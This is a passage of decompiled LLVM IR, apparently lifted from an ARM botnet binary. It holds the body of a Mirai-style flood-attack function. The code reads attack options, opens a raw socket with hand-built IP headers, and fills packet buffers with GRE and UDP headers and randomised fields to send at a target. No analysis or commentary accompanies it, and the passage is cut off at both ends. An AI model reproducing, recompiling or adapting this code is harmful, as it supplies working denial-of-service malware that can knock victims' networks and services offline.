  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_9a6c = load i32, i32* @r4, align 4
  %v6_9a6c = load i32, i32* @r5, align 4
  %v24_9a6c = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_9a88 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_9a8c = load i32, i32* @r5, align 4
  store i32 %v0_9a8c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9a9c = load i32, i32* @r4, align 4
  %v5_9aa0 = inttoptr i32 %v0_9a8c to i32*
  %v6_9aa0 = call i32 @attack_get_opt_int(i32 %v0_9a9c, i32* %v5_9aa0, i32 2, i32 0)
  %v1_9aac = urem i32 %v6_9aa0, 256
  store i32 %v1_9aac, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9ab8 = load i32, i32* @r5, align 4
  store i32 %v0_9ab8, i32* %r1.global-to-local, align 4
  %v0_9abc = load i32, i32* @r4, align 4
  %v5_9ac0 = trunc i32 %v6_9aa0 to i8
  %v6_9ac4 = inttoptr i32 %v0_9ab8 to i32*
  %v7_9ac4 = call i32 @attack_get_opt_int(i32 %v0_9abc, i32* %v6_9ac4, i32 3, i32 65535)
  %v0_9ac8 = load i32, i32* @r5, align 4
  store i32 %v0_9ac8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9ac4, i32* %fp.global-to-local, align 4
  %v0_9ad8 = load i32, i32* @r4, align 4
  %v4_9adc = inttoptr i32 %v0_9ac8 to i32*
  %v5_9adc = call i32 @attack_get_opt_int(i32 %v0_9ad8, i32* %v4_9adc, i32 4, i32 64)
  %v1_9ae4 = urem i32 %v5_9adc, 256
  store i32 %v1_9ae4, i32* %ip.global-to-local, align 4
  %v0_9ae8 = load i32, i32* @r5, align 4
  store i32 %v0_9ae8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9af4 = load i32, i32* @r4, align 4
  %v6_9afc = inttoptr i32 %v0_9ae8 to i32*
  %v7_9afc = call i32 @attack_get_opt_int(i32 %v0_9af4, i32* %v6_9afc, i32 5, i32 1)
  %v1_9b08 = urem i32 %v7_9afc, 256
  store i32 %v1_9b08, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_9b14 = load i32, i32* @r5, align 4
  store i32 %v0_9b14, i32* %r1.global-to-local, align 4
  %v0_9b18 = load i32, i32* @r4, align 4
  %v5_9b20 = inttoptr i32 %v0_9b14 to i32*
  %v6_9b20 = call i32 @attack_get_opt_int(i32 %v0_9b18, i32* %v5_9b20, i32 6, i32 65535)
  %v0_9b28 = load i32, i32* @r5, align 4
  store i32 %v0_9b28, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_9b20, i32* @r8, align 4
  %v0_9b38 = load i32, i32* @r4, align 4
  %v4_9b3c = inttoptr i32 %v0_9b28 to i32*
  %v5_9b3c = call i32 @attack_get_opt_int(i32 %v0_9b38, i32* %v4_9b3c, i32 7, i32 65535)
  %v0_9b40 = load i32, i32* @r5, align 4
  store i32 %v0_9b40, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_9b3c, i32* @r7, align 4
  %v0_9b50 = load i32, i32* @r4, align 4
  %v4_9b54 = inttoptr i32 %v0_9b40 to i32*
  %v5_9b54 = call i32 @attack_get_opt_int(i32 %v0_9b50, i32* %v4_9b54, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9b64 = load i32, i32* @r5, align 4
  store i32 %v0_9b64, i32* %r1.global-to-local, align 4
  %v0_9b68 = load i32, i32* @r4, align 4
  %v4_9b6c = inttoptr i32 %v0_9b64 to i32*
  %v5_9b6c = call i32 @attack_get_opt_int(i32 %v0_9b68, i32* %v4_9b6c, i32 1, i32 1)
  %v1_9b74 = urem i32 %v5_9b6c, 256
  store i32 %v1_9b74, i32* %ip.global-to-local, align 4
  %v0_9b78 = load i32, i32* @r5, align 4
  store i32 %v0_9b78, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9b84 = load i32, i32* @r4, align 4
  %v5_9b8c = inttoptr i32 %v0_9b78 to i32*
  %v6_9b8c = call i32 @attack_get_opt_int(i32 %v0_9b84, i32* %v5_9b8c, i32 19, i32 0)
  %v0_9b94 = load i32, i32* @r5, align 4
  store i32 %v0_9b94, i32* %r1.global-to-local, align 4
  %v2_9b98 = load i32, i32* @global_var_25d48.57, align 4
  store i32 %v2_9b98, i32* %r3.global-to-local, align 4
  store i32 %v6_9b8c, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9ba4 = load i32, i32* @r4, align 4
  %v4_9ba8 = inttoptr i32 %v0_9b94 to i32*
  %v5_9ba8 = call i32 @attack_get_opt_int(i32 %v0_9ba4, i32* %v4_9ba8, i32 25, i32 %v2_9b98)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_9bbc = call i32 @socket(i32 2, i32 3, i32 6)
  %v7_9bc0 = icmp eq i32 %v3_9bbc, -1
  store i1 %v7_9bc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9bc0, label %dec_label_pc_a060, label %dec_label_pc_9bcc

dec_label_pc_9bcc:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9bd4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9bd4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9be8 = call i32 @__GI_setsockopt(i32 %v3_9bbc, i32 0, i32 3, i32 %v6_9bd4, i32 4)
  %v7_9bec = icmp eq i32 %v5_9be8, -1
  store i1 %v7_9bec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9bec, label %dec_label_pc_a058, label %dec_label_pc_9bf4

dec_label_pc_9bf4:                                ; preds = %dec_label_pc_9bcc
  %v0_9bf4 = load i32, i32* @r8, align 4
  %v0_9bf8 = load i32, i32* @r7, align 4
  %v0_9bfc = load i32, i32* %fp.global-to-local, align 4
  %v0_9c00 = load i32, i32* @r6, align 4
  %v1_9c00 = urem i32 %v0_9c00, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_9c08 = urem i32 %v0_9bf4, 65536
  store i32 %v3_9c08, i32* %r3.global-to-local, align 4
  %v3_9c0c = urem i32 %v0_9bf8, 65536
  store i32 %v3_9c0c, i32* %r4.global-to-local, align 4
  %v0_9c10 = load i32, i32* @sl, align 4
  %v2_9c10 = icmp eq i32 %v0_9c10, 0
  store i1 %v2_9c10, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_9c28 = urem i32 %v0_9bfc, 65536
  store i32 %v3_9c28, i32* @fp, align 4
  br i1 %v2_9c10, label %dec_label_pc_a06c, label %dec_label_pc_9c38

dec_label_pc_9c38:                                ; preds = %dec_label_pc_9bf4
  %v3_9bf8 = mul i32 %v0_9bf8, 65536
  %v3_9bf4 = mul i32 %v0_9bf4, 65536
  %v0_9bfc.not = or i32 %v0_9bfc, -65536
  %v1_9c3c = xor i32 %v0_9bfc.not, 65535
  %v3_9c40 = mul i32 %v5_9b54, 65536
  %v1_9c44 = add i32 %v3_9c40, 3407872
  %tmp67 = udiv i32 %v1_9c44, 256
  %v3_9c58 = and i32 %tmp67, 65280
  %tmp68 = mul nsw i32 %v1_9c3c, 256
  %v3_9c5c = and i32 %tmp68, 65280
  store i32 %v3_9c5c, i32* %ip.global-to-local, align 4
  %v1_9c60 = add i32 %v3_9c40, 524288
  %v1_9c68 = add i32 %v3_9c40, 1835008
  %tmp69 = udiv i32 %v1_9c3c, 256
  %v4_9c6c = urem i32 %tmp69, 256
  %v5_9c6c = or i32 %v4_9c6c, %v3_9c5c
  %v4_9c74 = udiv i32 %v1_9c44, 16777216
  %v5_9c74 = or i32 %v3_9c58, %v4_9c74
  store i32 %v5_9c74, i32* @r8, align 4
  %v3_9c80 = udiv i32 %v1_9c68, 256
  %tmp70 = mul i32 %v0_9bfc, 256
  %v3_9c84 = and i32 %tmp70, 65280
  store i32 %v3_9bf4, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v0_9bfc, 256
  %v4_9c94 = urem i32 %tmp71, 256
  %v5_9c94 = or i32 %v4_9c94, %v3_9c84
  %tmp72 = mul i32 %v0_9bf4, 256
  %v3_9c98 = and i32 %tmp72, 65280
  %v1_9c9c = and i32 %v3_9c80, 65280
  store i32 %v1_9c9c, i32* @r6, align 4
  store i32 %v3_9bf8, i32* %r1.global-to-local, align 4
  %tmp73 = mul i32 %v0_9bf8, 256
  %v3_9ca8 = and i32 %tmp73, 65280
  %tmp74 = udiv i32 %v0_9bf4, 256
  %v4_9cac = urem i32 %tmp74, 256
  %v5_9cac = or i32 %v4_9cac, %v3_9c98
  store i32 %v5_9cac, i32* @lr, align 4
  %v4_9cb0 = udiv i32 %v1_9c68, 16777216
  %v5_9cb0 = or i32 %v1_9c9c, %v4_9cb0
  store i32 %v5_9cb0, i32* %r3.global-to-local, align 4
  %tmp75 = udiv i32 %v0_9bf8, 256
  %v4_9cb4 = urem i32 %tmp75, 256
  %v5_9cb4 = or i32 %v4_9cb4, %v3_9ca8
  %tmp76 = udiv i32 %v1_9c60, 256
  %v3_9cb8 = and i32 %tmp76, 65280
  store i32 %v3_9cb8, i32* @r5, align 4
  %v4_9ccc = udiv i32 %v1_9c60, 16777216
  %v5_9ccc = or i32 %v3_9cb8, %v4_9ccc
  store i32 %v5_9ccc, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v4_9d20 = sext i8 %v5_9ac0 to i32
  %sext12 = mul nuw i32 %v5_9c94, 65536
  %v4_9d3813 = sdiv i32 %sext12, 65536
  %sext8 = mul nuw i32 %v5_9cb0, 65536
  %v4_9d9c = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_9c6c, 65536
  %v4_9da0 = sdiv i32 %sext9, 65536
  %v1_9da8 = trunc i32 %v4_9d9c to i16
  %v2_9dd0 = icmp eq i32 %v1_9c00, 0
  %sext10 = mul nuw i32 %v5_9cac, 65536
  %v4_9df0 = sdiv i32 %sext10, 65536
  %sext11 = mul nuw i32 %v5_9cb4, 65536
  %v4_9df8 = sdiv i32 %sext11, 65536
  %v1_9d30 = trunc i32 %v5_9adc to i8
  br label %dec_label_pc_9cd4

dec_label_pc_9cd4:                                ; preds = %bb82, %dec_label_pc_9c38
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_9ce0 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_9a88, i32* %r2.global-to-local, align 4
  %v3_9ce8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9ce8, i32* %r3.global-to-local, align 4
  %v2_9cec = load i32, i32* @r4, align 4
  %v5_9cec = mul i32 %v2_9cec, 4
  %v6_9cec = add i32 %v5_9cec, %v2_9a88
  %v7_9cec = inttoptr i32 %v6_9cec to i32*
  store i32 %v2_9ce0, i32* %v7_9cec, align 4
  %v0_9cf0 = load i32, i32* %r2.global-to-local, align 4
  %v1_9cf0 = load i32, i32* %r3.global-to-local, align 4
  %v4_9cf0 = mul i32 %v1_9cf0, 4
  %v5_9cf0 = add i32 %v4_9cf0, %v0_9cf0
  %v6_9cf0 = inttoptr i32 %v5_9cf0 to i32*
  %v7_9cf0 = load i32, i32* %v6_9cf0, align 4
  store i32 %v7_9cf0, i32* %r4.global-to-local, align 4
  %v1_9cf4 = inttoptr i32 %v7_9cf0 to i8*
  %v2_9cf4 = load i8, i8* %v1_9cf4, align 1
  %tmp = urem i8 %v2_9cf4, 16
  %v1_9cf8 = zext i8 %tmp to i32
  %v1_9cfc = or i32 %v1_9cf8, 64
  store i32 %v1_9cfc, i32* %r2.global-to-local, align 4
  %v1_9d00 = trunc i32 %v1_9cfc to i8
  store i8 %v1_9d00, i8* %v1_9cf4, align 1
  %v0_9d04 = load i32, i32* %r3.global-to-local, align 4
  %v5_9d08 = mul i32 %v0_9d04, 24
  store i32 %v5_9d08, i32* %r1.global-to-local, align 4
  %v0_9d0c = load i32, i32* %r4.global-to-local, align 4
  %v1_9d0c = inttoptr i32 %v0_9d0c to i8*
  %v2_9d0c = load i8, i8* %v1_9d0c, align 1
  %v1_9d10 = and i8 %v2_9d0c, -16
  %v1_9d14 = or i8 %v1_9d10, 5
  store i32 %v1_9b08, i32* %r5.global-to-local, align 4
  store i8 %v1_9d14, i8* %v1_9d0c, align 1
  store i32 %v4_9d20, i32* %r2.global-to-local, align 4
  %v2_9d24 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d24 = add i32 %v2_9d24, 1
  %v4_9d24 = inttoptr i32 %v3_9d24 to i8*
  store i8 %v5_9ac0, i8* %v4_9d24, align 1
  store i32 %v1_9ae4, i32* %r3.global-to-local, align 4
  %v0_9d2c = load i32, i32* %r5.global-to-local, align 4
  %v2_9d2c = icmp eq i32 %v0_9d2c, 0
  store i1 %v2_9d2c, i1* %cpsr_z.global-to-local, align 1
  %v2_9d30 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d30 = add i32 %v2_9d30, 8
  %v4_9d30 = inttoptr i32 %v3_9d30 to i8*
  store i8 %v1_9d30, i8* %v4_9d30, align 1
  %v0_9d34 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9d34, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_9cd4
  store i32 %v4_9d3813, i32* %r5.global-to-local, align 4
  br label %bb77

bb:                                               ; preds = %dec_label_pc_9cd4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v4_9d3813, i32* %r5.global-to-local, align 4
  %v3_9d3c = load i32, i32* %r4.global-to-local, align 4
  %v4_9d3c = add i32 %v3_9d3c, 6
  %v5_9d3c = inttoptr i32 %v4_9d3c to i16*
  store i16 64, i16* %v5_9d3c, align 2
  br label %bb77

bb77:                                             ; preds = %.thread, %bb
  %v2_9d44 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d44 = add i32 %v2_9d44, 9
  %v4_9d44 = inttoptr i32 %v3_9d44 to i8*
  store i8 47, i8* %v4_9d44, align 1
  %v0_9d48 = load i32, i32* %r4.global-to-local, align 4
  %v1_9d48 = add i32 %v0_9d48, 20
  store i32 %v1_9d48, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_9d50 = load i32, i32* %r5.global-to-local, align 4
  %v1_9d50 = trunc i32 %v0_9d50 to i16
  %v3_9d50 = add i32 %v0_9d48, 4
  %v4_9d50 = inttoptr i32 %v3_9d50 to i16*
  store i16 %v1_9d50, i16* %v4_9d50, align 2
  %v0_9d54 = load i32, i32* @r8, align 4
  %v1_9d54 = trunc i32 %v0_9d54 to i16
  %v2_9d54 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d54 = add i32 %v2_9d54, 2
  %v4_9d54 = inttoptr i32 %v3_9d54 to i16*
  store i16 %v1_9d54, i16* %v4_9d54, align 2
  %v0_9d58 = load i32, i32* %r3.global-to-local, align 4
  %v1_9d58 = trunc i32 %v0_9d58 to i16
  %v2_9d58 = load i32, i32* %r2.global-to-local, align 4
  %v3_9d58 = add i32 %v2_9d58, 2
  %v4_9d58 = inttoptr i32 %v3_9d58 to i16*
  store i16 %v1_9d58, i16* %v4_9d58, align 2
  store i32 %v5_9ba8, i32* %r3.global-to-local, align 4
  %v0_9d60 = load i32, i32* %r4.global-to-local, align 4
  %v1_9d60 = add i32 %v0_9d60, 24
  %v2_9d60 = inttoptr i32 %v1_9d60 to i8*
  %v3_9d60 = load i8, i8* %v2_9d60, align 1
  %v4_9d60 = zext i8 %v3_9d60 to i32
  store i32 %v4_9d60, i32* %r2.global-to-local, align 4
  %v2_9d64 = add i32 %v0_9d60, 12
  %v3_9d64 = inttoptr i32 %v2_9d64 to i32*
  store i32 %v5_9ba8, i32* %v3_9d64, align 4
  %v0_9d68 = load i32, i32* %r2.global-to-local, align 4
  %v1_9d68 = and i32 %v0_9d68, -241
  %v1_9d6c = or i32 %v1_9d68, 64
  store i32 %v1_9d6c, i32* %r2.global-to-local, align 4
  %v0_9d70 = load i32, i32* %r1.global-to-local, align 4
  %v1_9d70 = load i32, i32* @sb, align 4
  %v2_9d70 = add i32 %v1_9d70, %v0_9d70
  store i32 %v2_9d70, i32* %r1.global-to-local, align 4
  %v1_9d74 = add i32 %v2_9d70, 16
  %v2_9d74 = inttoptr i32 %v1_9d74 to i32*
  %v3_9d74 = load i32, i32* %v2_9d74, align 4
  store i32 %v3_9d74, i32* %r1.global-to-local, align 4
  %v1_9d78 = trunc i32 %v1_9d6c to i8
  %v2_9d78 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d78 = add i32 %v2_9d78, 24
  %v4_9d78 = inttoptr i32 %v3_9d78 to i8*
  store i8 %v1_9d78, i8* %v4_9d78, align 1
  %v0_9d7c = load i32, i32* %r4.global-to-local, align 4
  %v1_9d7c = add i32 %v0_9d7c, 24
  %v2_9d7c = inttoptr i32 %v1_9d7c to i8*
  %v3_9d7c = load i8, i8* %v2_9d7c, align 1
  %v1_9d80 = and i8 %v3_9d7c, -16
  %v1_9d84 = or i8 %v1_9d80, 5
  store i8 %v1_9d84, i8* %v2_9d7c, align 1
  %v0_9d8c = load i32, i32* %r1.global-to-local, align 4
  %v1_9d8c = load i32, i32* %r4.global-to-local, align 4
  %v2_9d8c = add i32 %v1_9d8c, 16
  %v3_9d8c = inttoptr i32 %v2_9d8c to i32*
  store i32 %v0_9d8c, i32* %v3_9d8c, align 4
  %v0_9d94 = load i32, i32* %r4.global-to-local, align 4
  %v1_9d94 = add i32 %v0_9d94, 24
  store i32 %v1_9d94, i32* @r5, align 4
  %v3_9d98 = add i32 %v0_9d94, 25
  %v4_9d98 = inttoptr i32 %v3_9d98 to i8*
  store i8 %v5_9ac0, i8* %v4_9d98, align 1
  store i32 %v4_9d9c, i32* %r2.global-to-local, align 4
  store i32 %v4_9da0, i32* %r3.global-to-local, align 4
  store i32 %v1_9ae4, i32* %r1.global-to-local, align 4
  %v2_9da8 = load i32, i32* @r5, align 4
  %v3_9da8 = add i32 %v2_9da8, 2
  %v4_9da8 = inttoptr i32 %v3_9da8 to i16*
  store i16 %v1_9da8, i16* %v4_9da8, align 2
  %v0_9dac = load i32, i32* %r3.global-to-local, align 4
  %v1_9dac = trunc i32 %v0_9dac to i16
  %v2_9dac = load i32, i32* @r5, align 4
  %v3_9dac = add i32 %v2_9dac, 4
  %v4_9dac = inttoptr i32 %v3_9dac to i16*
  store i16 %v1_9dac, i16* %v4_9dac, align 2
  %v0_9db0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9db0, label %bb79, label %bb78

bb78:                                             ; preds = %bb77
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %bb77, %bb78
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_9db8 = load i32, i32* %r1.global-to-local, align 4
  %v1_9db8 = trunc i32 %v0_9db8 to i8
  %v2_9db8 = load i32, i32* @r5, align 4
  %v3_9db8 = add i32 %v2_9db8, 8
  %v4_9db8 = inttoptr i32 %v3_9db8 to i8*
  store i8 %v1_9db8, i8* %v4_9db8, align 1
  %v0_9dbc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9dbc, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_9dbc = load i32, i32* %r2.global-to-local, align 4
  %v2_9dbc = trunc i32 %v1_9dbc to i16
  %v3_9dbc = load i32, i32* @r5, align 4
  %v4_9dbc = add i32 %v3_9dbc, 6
  %v5_9dbc = inttoptr i32 %v4_9dbc to i16*
  store i16 %v2_9dbc, i16* %v5_9dbc, align 2
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v0_9dc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_9dc0 = trunc i32 %v0_9dc0 to i8
  %v2_9dc0 = load i32, i32* @r5, align 4
  %v3_9dc0 = add i32 %v2_9dc0, 9
  %v4_9dc0 = inttoptr i32 %v3_9dc0 to i8*
  store i8 %v1_9dc0, i8* %v4_9dc0, align 1
  %v0_9dc4 = call i32 @rand_next()
  store i32 %v1_9c00, i32* %r1.global-to-local, align 4
  store i1 %v2_9dd0, i1* %cpsr_z.global-to-local, align 1
  %v1_9dd4 = sub i32 1023, %v0_9dc4
  store i32 %v1_9dd4, i32* %r3.global-to-local, align 4
  br i1 %v2_9dd0, label %.thread14, label %.thread15

.thread14:                                        ; preds = %bb81
  %v2_9ddc = load i32, i32* @r5, align 4
  %v3_9ddc = add i32 %v2_9ddc, 16
  %v4_9ddc = inttoptr i32 %v3_9ddc to i32*
  store i32 %v1_9dd4, i32* %v4_9ddc, align 4
  br label %bb82

.thread15:                                        ; preds = %bb81
  %v1_9dd8 = load i32, i32* %r4.global-to-local, align 4
  %v2_9dd8 = add i32 %v1_9dd8, 16
  %v3_9dd8 = inttoptr i32 %v2_9dd8 to i32*
  %v4_9dd8 = load i32, i32* %v3_9dd8, align 4
  store i32 %v4_9dd8, i32* %r3.global-to-local, align 4
  %v2_9de0 = load i32, i32* @r5, align 4
  %v3_9de0 = add i32 %v2_9de0, 16
  %v4_9de0 = inttoptr i32 %v3_9de0 to i32*
  store i32 %v4_9dd8, i32* %v4_9de0, align 4
  br label %bb82

bb82:                                             ; preds = %.thread14, %.thread15
  %v1_9de4 = load i32, i32* @r5, align 4
  %v2_9de4 = add i32 %v1_9de4, 12
  %v3_9de4 = inttoptr i32 %v2_9de4 to i32*
  store i32 %v0_9dc4, i32* %v3_9de4, align 4
  %v3_9de8 = load i32, i32* %stack_var_-44, align 4
  %v0_9dec = load i32, i32* %r4.global-to-local, align 4
  %v1_9dec = add i32 %v0_9dec, 44
  store i32 %v1_9dec, i32* @r6, align 4
  store i32 %v4_9df0, i32* %r2.global-to-local, align 4
  %v1_9df4 = add i32 %v3_9de8, 1
  store i32 %v1_9df4, i32* @r4, align 4
  store i32 %v4_9df8, i32* %r3.global-to-local, align 4
  %v1_9dfc = load i32, i32* @sl, align 4
  %v9_9dfc = icmp eq i32 %v1_9df4, %v1_9dfc
  store i1 %v9_9dfc, i1* %cpsr_z.global-to-local, align 1
  %v0_9e00 = load i32, i32* @r7, align 4
  %v1_9e00 = trunc i32 %v0_9e00 to i16
  %v3_9e00 = add i32 %v0_9dec, 48
  %v4_9e00 = inttoptr i32 %v3_9e00 to i16*
  store i16 %v1_9e00, i16* %v4_9e00, align 2
  %v0_9e04 = load i32, i32* %r2.global-to-local, align 4
  %v1_9e04 = trunc i32 %v0_9e04 to i16
  %v2_9e04 = load i32, i32* @r6, align 4
  %v3_9e04 = inttoptr i32 %v2_9e04 to i16*
  store i16 %v1_9e04, i16* %v3_9e04, align 2
  %v0_9e08 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e08 = trunc i32 %v0_9e08 to i16
  %v2_9e08 = load i32, i32* @r6, align 4
  %v3_9e08 = add i32 %v2_9e08, 2
  %v4_9e08 = inttoptr i32 %v3_9e08 to i16*
  store i16 %v1_9e08, i16* %v4_9e08, align 2
  %v0_9e0c = load i32, i32* @r4, align 4
  store i32 %v0_9e0c, i32* %stack_var_-44, align 4
  %v5_9e10 = icmp slt i32 %v1_9df4, %v1_9dfc
  br i1 %v5_9e10, label %dec_label_pc_9cd4, label %dec_label_pc_9e14

dec_label_pc_9e14:                                ; preds = %bb82
  store i32 %v5_9b54, i32* %r5.global-to-local, align 4
  %v1_9e1c = add i32 %v5_9b54, 8
  store i32 %v1_9e1c, i32* %r4.global-to-local, align 4
  %v0_9e2c.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_9e28.preheader

dec_label_pc_9e28.preheader:                      ; preds = %dec_label_pc_9e14, %dec_label_pc_a06c
  %v0_9e2c.pre = phi i32 [ %v0_9e2c.pre.pre, %dec_label_pc_9e14 ], [ 0, %dec_label_pc_a06c ]
  %stack_var_-124.0.ph = phi i32 [ %v1_9e1c, %dec_label_pc_9e14 ], [ %v1_a074, %dec_label_pc_a06c ]
  %storemerge = add i32 %v5_9b54, 52
  store i32 %storemerge, i32* @r8, align 4
  %v2_a020 = icmp eq i32 %v1_9c00, 0
  %v2_a03c = icmp eq i32 %v1_9b74, 0
  %v2_9e68 = icmp eq i32 %v5_9ba8, -1
  %v7_9e68 = icmp eq i32 %v5_9ba8, -1
  br label %dec_label_pc_9e28

dec_label_pc_9e28:                                ; preds = %dec_label_pc_9e28, %dec_label_pc_9eb8, %dec_label_pc_9e28.preheader
  %v0_9e2c = phi i32 [ %v0_9e2c.pre, %dec_label_pc_9e28.preheader ], [ 0, %dec_label_pc_9e28 ], [ %v1_9f54, %dec_label_pc_9eb8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9e2c = icmp eq i32 %v0_9e2c, 0
  store i1 %v2_9e2c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9e2c, label %dec_label_pc_9e28, label %dec_label_pc_9e38

dec_label_pc_9e38:                                ; preds = %dec_label_pc_9e28
  br label %dec_label_pc_9e3c

dec_label_pc_9e3c:                                ; preds = %dec_label_pc_9eb8, %dec_label_pc_9e38
  %v1_9e50 = phi i32 [ %v1_9f50, %dec_label_pc_9eb8 ], [ 0, %dec_label_pc_9e38 ]
  %v5_9e40 = mul i32 %v1_9e50, 24
  %v1_9e44 = load i32, i32* @sb, align 4
  %v2_9e44 = add i32 %v1_9e44, %v5_9e40
  store i32 %v2_9e44, i32* %r3.global-to-local, align 4
  store i32 %v2_9a88, i32* %r4.global-to-local, align 4
  %v1_9e4c = add i32 %v2_9e44, 20
  %v2_9e4c = inttoptr i32 %v1_9e4c to i8*
  %v3_9e4c = load i8, i8* %v2_9e4c, align 1
  %v4_9e4c = zext i8 %v3_9e4c to i32
  store i32 %v4_9e4c, i32* %r2.global-to-local, align 4
  %v4_9e50 = mul i32 %v1_9e50, 4
  %v5_9e50 = add i32 %v4_9e50, %v2_9a88
  %v6_9e50 = inttoptr i32 %v5_9e50 to i32*
  %v7_9e50 = load i32, i32* %v6_9e50, align 4
  store i32 %v7_9e50, i32* @r5, align 4
  %v7_9e54 = icmp eq i8 %v3_9e4c, 31
  store i1 %v7_9e54, i1* %cpsr_z.global-to-local, align 1
  %v1_9e58 = add i32 %v7_9e50, 24
  store i32 %v1_9e58, i32* @r6, align 4
  %v1_9e5c = add i32 %v7_9e50, 44
  store i32 %v1_9e5c, i32* @r7, align 4
  %tmp86 = icmp ult i8 %v3_9e4c, 32
  br i1 %tmp86, label %dec_label_pc_9f64, label %dec_label_pc_9e64

dec_label_pc_9e64:                                ; preds = %dec_label_pc_9e3c
  store i32 %v5_9ba8, i32* %r1.global-to-local, align 4
  store i1 %v7_9e68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9e68, label %dec_label_pc_9fc4, label %dec_label_pc_9e70

dec_label_pc_9e70:                                ; preds = %dec_label_pc_9f64, %dec_label_pc_9e64
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_9e78 = load i32, i32* @fp, align 4
  %v9_9e78 = icmp eq i32 %v0_9e78, 65535
  store i1 %v9_9e78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9e78, label %dec_label_pc_9fdc, label %dec_label_pc_9e80

dec_label_pc_9e80:                                ; preds = %dec_label_pc_9fc4.dec_label_pc_9e80_crit_edge, %dec_label_pc_9e70
  %v1_9e84 = phi i32 [ %v1_9e84.pre, %dec_label_pc_9fc4.dec_label_pc_9e80_crit_edge ], [ 65535, %dec_label_pc_9e70 ]
  store i32 %v3_9c08, i32* %r2.global-to-local, align 4
  %v9_9e84 = icmp eq i32 %v3_9c08, %v1_9e84
  store i1 %v9_9e84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9e84, label %dec_label_pc_a004, label %dec_label_pc_9e8c

dec_label_pc_9e8c:                                ; preds = %dec_label_pc_9fdc.dec_label_pc_9e8c_crit_edge, %dec_label_pc_9e80
  %v1_9e90 = phi i32 [ %v1_9e90.pre, %dec_label_pc_9fdc.dec_label_pc_9e8c_crit_edge ], [ %v1_9e84, %dec_label_pc_9e80 ]
  store i32 %v3_9c0c, i32* %r3.global-to-local, align 4
  %v9_9e90 = icmp eq i32 %v3_9c0c, %v1_9e90
  store i1 %v9_9e90, i1* %cpsr_z.global-to-local, align 1
